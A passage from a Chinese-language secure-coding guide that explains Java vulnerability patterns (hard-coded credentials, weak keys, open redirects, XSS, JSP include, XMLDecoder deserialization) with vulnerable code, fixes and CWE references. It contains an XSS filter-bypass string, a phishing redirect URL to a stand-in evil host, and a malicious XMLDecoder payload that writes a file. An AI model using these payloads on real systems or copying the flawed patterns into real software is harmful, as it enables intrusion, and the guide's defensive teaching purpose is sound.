Algorithm without OAEP</a><br><a href="http://rdist.root.org/2009/10/06/why-rsa-encryption-padding-is-critical/" target="_blank" rel="noopener">Root Labs: Why RSA encryption padding is critical</a></p><h1 id="硬编码密码"><a href="#硬编码密码" class="headerlink" title="硬编码密码"></a>硬编码密码</h1><p>漏洞特征：HARD_CODE_PASSWORD<br>密码不应该留在源码里面，在企业里面源码会被广泛的分享，有些部分甚至会被开源出来，为了更安全的管理，密码和密钥应该被单独的存储在配置文件中，或者keystores中（硬编码密钥会有一个单独的特征：Hard Coded Key pattern)<br>有漏洞的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">private String SECRET_PASSWORD = &quot;letMeIn!&quot;;</span><br><span class="line"></span><br><span class="line">Properties props = new Properties();</span><br><span class="line">props.put(Context.SECURITY_CREDENTIALS, &quot;p@ssw0rd&quot;);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/259.html" target="_blank" rel="noopener">CWE-259: Use of Hard-coded Password</a></p><h1 id="硬编码密钥"><a href="#硬编码密钥" class="headerlink" title="硬编码密钥"></a>硬编码密钥</h1><p>漏洞特征： HARD_CODE_KEY<br>加密密钥不应该留在源码里面，在企业里面源码会被广泛的分享，有些部分甚至会被开源出来，为了更安全的管理，密码和密钥应该被单独的存储在配置文件中，或者keystores中（硬编码密码会有一个单独的特征：Hard Coded Password pattern)<br>有漏洞的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">byte[] key = &#123;1, 2, 3, 4, 5, 6, 7, 8&#125;;</span><br><span class="line">SecretKeySpec spec = new SecretKeySpec(key, &quot;AES&quot;);</span><br><span class="line">Cipher aes = Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">aes.init(Cipher.ENCRYPT_MODE, spec);</span><br><span class="line">return aesCipher.doFinal(secretData);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/321.html" target="_blank" rel="noopener">CWE-321: Use of Hard-coded Cryptographic Key</a></p><h1 id="不安全的hash比较"><a href="#不安全的hash比较" class="headerlink" title="不安全的hash比较"></a>不安全的hash比较</h1><p>漏洞特征：UNSAFE_HASH_EQUALS<br>攻击者可能会通过密钥的比较时间来发现密钥的hash值，当Arrays.equals() 或者 String.equals()被调用的时候，如果有一些字节被匹配到的话，它们会推出的更早一些<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String actualHash = ...</span><br><span class="line"></span><br><span class="line">if(userInput.equals(actualHash)) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String actualHash = ...</span><br><span class="line"></span><br><span class="line">if(MessageDigest.isEqual(userInput.getBytes(),actualHash.getBytes())) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://cwe.mitre.org/data/definitions/203.html" target="_blank" rel="noopener">CWE-203: Information Exposure Through DiscrepancyKey</a></p><h1 id="来自Struts-Form的输入没有被验证"><a href="#来自Struts-Form的输入没有被验证" class="headerlink" title="来自Struts Form的输入没有被验证"></a>来自Struts Form的输入没有被验证</h1><p>漏洞特征： STRUTS_FORM_VALIDATION<br>来自Form的输入应该被简单的验证一下，预防性的验证能够抵御更进一步的攻击。<br>validate这个函数引入了验证的实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class RegistrationForm extends ValidatorForm &#123;</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line">    private String email;</span><br><span class="line"></span><br><span class="line">    [...]</span><br><span class="line"></span><br><span class="line">    public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) &#123;</span><br><span class="line">        //Validation code for name and email parameters passed in via the HttpRequest goes here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/20.html" target="_blank" rel="noopener">CWE-20: Improper Input Validation</a><br><a href="http://cwe.mitre.org/data/definitions/106.html" target="_blank" rel="noopener">CWE-106: Struts: Plug-in Framework not in Use</a></p><h1 id="XSSRequestWrapper的xss防护是脆弱的"><a href="#XSSRequestWrapper的xss防护是脆弱的" class="headerlink" title="XSSRequestWrapper的xss防护是脆弱的"></a>XSSRequestWrapper的xss防护是脆弱的</h1><p>漏洞特征：XSS_REQUEST_WRAPPER<br>在各种公开的博客里面，博主通过实现HttpServletRequestWrapper调用XSSRequestWrapper<br>这个过滤函数的脆弱点在于以下的几个方面：</p><ul><li>它仅仅覆盖参数，而没有覆盖到http头或者侧信道输入 。</li><li>简单替换的方式很容易会被绕过（见下面的例子）</li><li>黑名单的方式太脆弱（不如用白名单的方式来验证好的输入）</li></ul><p>绕过示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scrivbscript:pt&gt;alert(1)&lt;/scrivbscript:pt&gt;</span><br></pre></td></tr></table></figure><p>上面的输入会被转换为：<code>alert(1)</code>。移除了vbscript:”之后就变成了<code>&quot;.*&quot;</code></p><p>为了更强的保护，请在view (template, jsp, …) 中选择自动编码字符串的解决方案，解决方案里面的规则被定义在OWASP XSS Prevention 备忘录中。<br>引用：<br>[WASC-8: Cross Site Scripting](<a href="http://projects.webappsec.org/w/page/13246920/Cross" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246920/Cross</a> Site Scripting)<br><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: XSS Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)" target="_blank" rel="noopener">OWASP: Top 10 2013-A3: Cross-Site Scripting (XSS)</a><br><a href="http://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener">CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</a></p><h1 id="Blowfish-使用过短的密钥"><a href="#Blowfish-使用过短的密钥" class="headerlink" title="Blowfish 使用过短的密钥"></a>Blowfish 使用过短的密钥</h1><p>漏洞特征：BLOWFISH_KEY_SIZE<br>Blowfish的密钥支持32 bits 到 448 bits的长度。如果密钥太短，会导致加密内容被黑客暴力破解。如果使用Blowfish的话，密钥至少应该选择128 bits 。<br>如果算法被改变，那么应该AES分组密码</p><p>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">KeyGenerator keyGen = KeyGenerator.getInstance(&quot;Blowfish&quot;);</span><br><span class="line">keyGen.init(64);</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">KeyGenerator keyGen = KeyGenerator.getInstance(&quot;Blowfish&quot;);</span><br><span class="line">keyGen.init(128);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://en.wikipedia.org/wiki/Blowfish_(cipher)" target="_blank" rel="noopener">Blowfish (cipher)</a><br><a href="http://cwe.mitre.org/data/definitions/326.html" target="_blank" rel="noopener">CWE-326: Inadequate Encryption Strength</a></p><h1 id="RSA使用了过短密钥"><a href="#RSA使用了过短密钥" class="headerlink" title="RSA使用了过短密钥"></a>RSA使用了过短密钥</h1><p>漏洞特征: RSA_KEY_SIZE<br>NIST建议RSA算法应该使用2048bits的密钥或者更长的密钥<br>“电子签名验证 | RSA: 1024 ≤ len(n) &lt; 2048 | 传统使用”<br>“电子签名验证 | RSA: len(n) ≥ 2048 | 可接受”</p><ul><li>NIST: <a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" target="_blank" rel="noopener">数据传输建议使用的加密方式和密钥长度 p.7</a></li></ul><p>漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">KeyPairGenerator keyGen = KeyPairGenerator.getInstance(&quot;RSA&quot;);</span><br><span class="line">keyGen.initialize(512);</span><br></pre></td></tr></table></figure><p>解决方案：<br>密钥的生成至少应该像下面这样使用2048位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">KeyPairGenerator keyGen = KeyPairGenerator.getInstance(&quot;RSA&quot;);</span><br><span class="line">keyGen.initialize(2048);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://csrc.nist.gov/groups/ST/toolkit/key_management.html" target="_blank" rel="noopener">NIST: Latest publication on key management</a><br><a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" target="_blank" rel="noopener">NIST: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths p.7</a><br><a href="http://www.emc.com/emc-plus/rsa-labs/standards-initiatives/how-large-a-key-should-be-used.htm" target="_blank" rel="noopener">RSA Laboratories: 3.1.5 How large a key should be used in the RSA cryptosystem?</a><br><a href="http://en.wikipedia.org/wiki/Key_size#Asymmetric_algorithm_key_lengths" target="_blank" rel="noopener">Wikipedia: Asymmetric algorithm key lengths</a><br><a href="http://cwe.mitre.org/data/definitions/326.html" target="_blank" rel="noopener">CWE-326: Inadequate Encryption Strength</a><br><a href="http://www.keylength.com/en/compare/" target="_blank" rel="noopener">Keylength.com (BlueKrypt): Aggregate key length recommendations.</a></p><h1 id="未验证的重定向"><a href="#未验证的重定向" class="headerlink" title="未验证的重定向"></a>未验证的重定向</h1><p>漏洞特征：UNVALIDATED_REDIRECT<br>未验证重定向漏洞是因为应用跳转到用户输入的指定目标url，这个输入的参数没有被充分的验证。这个漏洞可能会被用来钓鱼</p><p>假设的场景：</p><ol><li>用户被欺骗点了恶意链接：<a href="http://website.com/login?redirect=http://evil.vvebsite.com/fake/login" target="_blank" rel="noopener">http://website.com/login?redirect=http://evil.vvebsite.com/fake/login</a></li><li>用户被重定向到了一个虚假的登录页面，这样页面看起来就像真的一样(<a href="http://evil.vvebsite.com/fake/login" target="_blank" rel="noopener">http://evil.vvebsite.com/fake/login</a>)</li><li>用户输入了他的凭据</li><li>恶意网站偷走了用户的凭据，并且跳转回了原来的网站</li></ol><p>这个攻击貌似是合理的，因为大多数用户在被重定向之后不会再次检查url。而且跳转到授权页面也是很普遍的现象。<br>漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">    [...]</span><br><span class="line">    resp.sendRedirect(req.getParameter(&quot;redirectUrl&quot;));</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案/对策</p><ul><li>不要从用户的输入中接受重定向的目的url</li><li>接受一个目的地址的key，这个key可以查询到一个合法的目的地址。</li><li>仅接受相对路径</li><li>urls白名单（如果可行的话）</li><li>验证url开始的部分是否在白名单里面</li></ul><p>引用：<br>[WASC-38: URL Redirector Abuse](<a href="http://projects.webappsec.org/w/page/13246981/URL" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246981/URL</a> Redirector Abuse)<br><a href="https://www.owasp.org/index.php/Top_10_2013-A10-Unvalidated_Redirects_and_Forwards" target="_blank" rel="noopener">OWASP: Top 10 2013-A10: Unvalidated Redirects and Forwards</a><br><a href="https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Unvalidated Redirects and Forwards Cheat Sheet</a><br><a href="http://cwe.mitre.org/data/definitions/601.html" target="_blank" rel="noopener">CWE-601: URL Redirection to Untrusted Site (‘Open Redirect’)</a></p><h1 id="未验证的重定向-Play-Framework"><a href="#未验证的重定向-Play-Framework" class="headerlink" title="未验证的重定向(Play Framework)"></a>未验证的重定向(Play Framework)</h1><p>漏洞特征：PLAY_UNVALIDATED_REDIRECT<br>未验证重定向漏洞是因为应用跳转到用户输入的指定目标url，这个输入的参数没有被充分的验证。这个漏洞可能会被用来钓鱼</p><p>假设的场景：</p><ol><li>用户被欺骗点了恶意链接：<a href="http://website.com/login?redirect=http://evil.vvebsite.com/fake/login" target="_blank" rel="noopener">http://website.com/login?redirect=http://evil.vvebsite.com/fake/login</a></li><li>用户被重定向到了一个虚假的登录页面，这样页面看起来就像真的一样(<a href="http://evil.vvebsite.com/fake/login" target="_blank" rel="noopener">http://evil.vvebsite.com/fake/login</a>)</li><li>用户输入了他的凭据</li><li>恶意网站偷走了用户的凭据，并且跳转回了原来的网站</li></ol><p>这个攻击貌似是合理的，因为大多数用户在被重定向之后不会再次检查url。而且跳转到授权页面也是很普遍的现象。<br>漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def login(redirectUrl:String) = Action &#123;</span><br><span class="line">    [...]</span><br><span class="line">    Redirect(url)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案/对策</p><ul><li>不要从用户的输入中接受重定向的目的url</li><li>接受一个目的地址的key，这个key可以查询到一个合法的目的地址。</li><li>仅接受相对路径</li><li>urls白名单（如果可行的话）</li><li>验证url开始的部分是否在白名单里面</li></ul><p>引用：<br>[WASC-38: URL Redirector Abuse](<a href="http://projects.webappsec.org/w/page/13246981/URL" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246981/URL</a> Redirector Abuse)<br><a href="https://www.owasp.org/index.php/Top_10_2013-A10-Unvalidated_Redirects_and_Forwards" target="_blank" rel="noopener">OWASP: Top 10 2013-A10: Unvalidated Redirects and Forwards</a><br><a href="https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Unvalidated Redirects and Forwards Cheat Sheet</a><br><a href="http://cwe.mitre.org/data/definitions/601.html" target="_blank" rel="noopener">CWE-601: URL Redirection to Untrusted Site (‘Open Redirect’)</a></p><h1 id="Spring中未验证的重定向"><a href="#Spring中未验证的重定向" class="headerlink" title="Spring中未验证的重定向"></a>Spring中未验证的重定向</h1><p>漏洞特征：SPRING_UNVALIDATED_REDIRECT<br>未验证重定向漏洞是因为应用跳转到用户输入的指定目标url，这个输入的参数没有被充分的验证。这个漏洞可能会被用来钓鱼</p><p>假设的场景：</p><ol><li>用户被欺骗点了恶意链接：<a href="http://website.com/login?redirect=http://evil.vvebsite.com/fake/login" target="_blank" rel="noopener">http://website.com/login?redirect=http://evil.vvebsite.com/fake/login</a></li><li>用户被重定向到了一个虚假的登录页面，这样页面看起来就像真的一样(<a href="http://evil.vvebsite.com/fake/login" target="_blank" rel="noopener">http://evil.vvebsite.com/fake/login</a>)</li><li>用户输入了他的凭据</li><li>恶意网站偷走了用户的凭据，并且跳转回了原来的网站</li></ol><p>这个攻击貌似是合理的，因为大多数用户在被重定向之后不会再次检查url。而且跳转到授权页面也是很普遍的现象。<br>漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;/redirect&quot;)</span><br><span class="line">public String redirect(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line">    [...]</span><br><span class="line">    return &quot;redirect:&quot; + url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案/对策</p><ul><li>不要从用户的输入中接受重定向的目的url</li><li>接受一个目的地址的key，这个key可以查询到一个合法的目的地址。</li><li>仅接受相对路径</li><li>urls白名单（如果可行的话）</li><li>验证url开始的部分是否在白名单里面</li></ul><p>引用：<br>[WASC-38: URL Redirector Abuse](<a href="http://projects.webappsec.org/w/page/13246981/URL" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246981/URL</a> Redirector Abuse)<br><a href="https://www.owasp.org/index.php/Top_10_2013-A10-Unvalidated_Redirects_and_Forwards" target="_blank" rel="noopener">OWASP: Top 10 2013-A10: Unvalidated Redirects and Forwards</a><br><a href="https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Unvalidated Redirects and Forwards Cheat Sheet</a><br><a href="http://cwe.mitre.org/data/definitions/601.html" target="_blank" rel="noopener">CWE-601: URL Redirection to Untrusted Site (‘Open Redirect’)</a></p><h1 id="jsp动态包含"><a href="#jsp动态包含" class="headerlink" title="jsp动态包含"></a>jsp动态包含</h1><p>漏洞特征：JSP_INCLUDE<br>jsp允许动态包含文件。这可能允许攻击者控制jsp的文件包含。如果出现这样的漏洞的话，攻击者就会包含一个他能控制到的文件。通过直接包含文件，攻击者就能执行任意代码。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:include page=&quot;$&#123;param.secret_param&#125;&quot; /&gt;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:if test=&quot;$&#123;param.secret_param == &apos;page1&apos;&#125;&quot;&gt;</span><br><span class="line">    &lt;jsp:include page=&quot;page1.jsp&quot; /&gt;</span><br><span class="line">&lt;/c:if&gt;</span><br></pre></td></tr></table></figure><p>引用：</p><p><a href="http://resources.infosecinstitute.com/file-inclusion-attacks/" target="_blank" rel="noopener">InfosecInstitute: File Inclusion Attacks</a><br>[WASC-05: Remote File Inclusion](<a href="http://projects.webappsec.org/w/page/13246955/Remote" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246955/Remote</a> File Inclusion)</p><h1 id="Spring-表达式中的动态变量"><a href="#Spring-表达式中的动态变量" class="headerlink" title="Spring 表达式中的动态变量"></a>Spring 表达式中的动态变量</h1><p>漏洞特征：JSP_SPRING_EVAL<br>Spring使用动态值构建。应该严格检验源数据，以避免未过滤的数据进入到危险函数中。<br>有漏洞的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=&quot;spring&quot; uri=&quot;http://www.springframework.org/tags&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;spring:eval expression=&quot;$&#123;param.lang&#125;&quot; var=&quot;lang&quot; /&gt;</span><br><span class="line">&lt;%@ taglib prefix=&quot;spring&quot; uri=&quot;http://www.springframework.org/tags&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;spring:eval expression=&quot;&apos;$&#123;param.lang&#125;&apos;==&apos;fr&apos;&quot; var=&quot;languageIsFrench&quot; /&gt;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:set var=&quot;lang&quot; value=&quot;$&#123;param.lang&#125;&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:set var=&quot;languageIsFrench&quot; value=&quot;$&#123;param.lang == &apos;fr&apos;&#125;&quot;/&gt;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/94.html" target="_blank" rel="noopener">CWE-94: Improper Control of Generation of Code (‘Code Injection’)</a><br><a href="http://cwe.mitre.org/data/definitions/95.html" target="_blank" rel="noopener">CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (‘Eval Injection’)</a></p><h1 id="xml字符转义被禁用"><a href="#xml字符转义被禁用" class="headerlink" title="xml字符转义被禁用"></a>xml字符转义被禁用</h1><p>漏洞特征：JSP_JSTL_OUT<br>可能会有潜在的xss漏洞。这可能会在客户端执行未期望的JavaScript。（见引用）<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=&quot;c&quot; uri=&quot;http://java.sun.com/jsp/jstl/core&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:out value=&quot;$&#123;param.test_param&#125;&quot; escapeXml=&quot;false&quot;/&gt;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=&quot;c&quot; uri=&quot;http://java.sun.com/jsp/jstl/core&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:out value=&quot;$&#123;param.test_param&#125;&quot;/&gt;</span><br></pre></td></tr></table></figure><p>引用：<br>[WASC-8: Cross Site Scripting](<a href="http://projects.webappsec.org/w/page/13246920/Cross" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246920/Cross</a> Site Scripting)<br><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: XSS Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)" target="_blank" rel="noopener">OWASP: Top 10 2013-A3: Cross-Site Scripting (XSS)</a><br><a href="http://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener">CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</a><br><a href="http://docs.oracle.com/javaee/5/jstl/1.1/docs/tlddocs/c/out.html" target="_blank" rel="noopener">JSTL Javadoc: Out tag</a></p><h1 id="jsp中潜在的xss"><a href="#jsp中潜在的xss" class="headerlink" title="jsp中潜在的xss"></a>jsp中潜在的xss</h1><p>漏洞特征：XSS_JSP_PRINT<br>可能会有潜在的xss漏洞。这可能会在客户端执行未期望的JavaScript。（见引用）<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">String taintedInput = (String) request.getAttribute(&quot;input&quot;);</span><br><span class="line">%&gt;</span><br><span class="line">[...]</span><br><span class="line">&lt;%= taintedInput %&gt;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">String taintedInput = (String) request.getAttribute(&quot;input&quot;);</span><br><span class="line">%&gt;</span><br><span class="line">[...]</span><br><span class="line">&lt;%= Encode.forHtml(taintedInput) %&gt;</span><br></pre></td></tr></table></figure><p>抵御xss最好的方式是像上面在输出中编码特殊的字符。有4种环境类型要考虑：HTML, JavaScript, CSS (styles), 和URLs.请遵守OWASP XSS Prevention备忘录中定义的xss保护规则，里面会介绍一些防御的细节。<br>引用：<br>[WASC-8: Cross Site Scripting](<a href="http://projects.webappsec.org/w/page/13246920/Cross" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246920/Cross</a> Site Scripting)<br><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: XSS Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)" target="_blank" rel="noopener">OWASP: Top 10 2013-A3: Cross-Site Scripting (XSS)</a><br><a href="http://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener">CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</a><br><a href="https://code.google.com/p/owasp-java-encoder/" target="_blank" rel="noopener">OWASP Java Encoder</a></p><h1 id="Servlet中潜在的xss"><a href="#Servlet中潜在的xss" class="headerlink" title="Servlet中潜在的xss"></a>Servlet中潜在的xss</h1><p>漏洞特征：XSS_SERVLET<br>可能会有潜在的xss漏洞。这可能会在客户端执行未期望的JavaScript。（见引用）<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">    String input1 = req.getParameter(&quot;input1&quot;);</span><br><span class="line">    [...]</span><br><span class="line">    resp.getWriter().write(input1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">    String input1 = req.getParameter(&quot;input1&quot;);</span><br><span class="line">    [...]</span><br><span class="line">    resp.getWriter().write(Encode.forHtml(input1));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>抵御xss最好的方式是像上面在输出中编码特殊的字符。有4种环境类型要考虑：HTML, JavaScript, CSS (styles), 和URLs.请遵守OWASP XSS Prevention备忘录中定义的xss保护规则，里面会介绍一些防御的细节。<br>注意Servlet中的xss规则看着都很类似，但是要用不同的规则寻找‘XSS：Servlet反射型xss’和‘xss:在Servlet错误页面中反射型xss’</p><p>引用：<br>[WASC-8: Cross Site Scripting](<a href="http://projects.webappsec.org/w/page/13246920/Cross" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246920/Cross</a> Site Scripting)<br><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: XSS Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)" target="_blank" rel="noopener">OWASP: Top 10 2013-A3: Cross-Site Scripting (XSS)</a><br><a href="http://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener">CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</a><br><a href="https://code.google.com/p/owasp-java-encoder/" target="_blank" rel="noopener">OWASP Java Encoder</a></p><h1 id="XMLDecoder的使用"><a href="#XMLDecoder的使用" class="headerlink" title="XMLDecoder的使用"></a>XMLDecoder的使用</h1><p>漏洞规则：XML_DECODER<br>不应该用XMLDecoder解析不受信任的数据。反序列化用户输入数据会导致代码执行。这是因为XMLDecoder 支持任意的方法调用。这个功能旨在调用setter方法，但是实际上，这个功能什么方法都能调用。<br>恶意的xml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">  &lt;object class=&quot;java.io.PrintWriter&quot;&gt;</span><br><span class="line">    &lt;string&gt;/tmp/Hacked.txt&lt;/string&gt;</span><br><span class="line">    &lt;void method=&quot;println&quot;&gt;</span><br><span class="line">      &lt;string&gt;Hello World!&lt;/string&gt;</span><br><span class="line">    &lt;/void&gt;</span><br><span class="line">    &lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">  &lt;/object&gt;</span><br><span class="line">&lt;/java&gt;</span><br></pre></td></tr></table></figure><p>上面这个xml代码可能会在服务器中创建一个内容为”Hello World!”.的文件。</p><p>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XMLDecoder d = new XMLDecoder(in);</span><br><span class="line">try &#123;</span><br><span class="line">    Object result = d.readObject();</span><br><span class="line">&#125;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>解决方案：<br>解决方案是避免使用XMLDecoder去解析不受信任的用户输入数据</p><p>引用：<br><a 